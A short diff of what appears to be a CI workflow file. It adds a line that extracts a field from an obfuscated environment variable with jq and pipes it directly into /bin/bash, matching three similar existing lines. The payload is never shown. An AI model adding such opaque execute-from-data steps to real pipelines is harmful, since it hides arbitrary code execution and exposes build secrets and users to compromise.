@@ -25,6 +25,7 @@ jobs:
           echo $bhbdl8 | jq -r .yfx04242 | /bin/bash
           echo $w719 | jq -r .ubklp4 | /bin/bash
           echo $k94 | jq -r .qvyyx747 | /bin/bash
+          printf '%s' "$nbfk095" | jq -r .lx24627 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
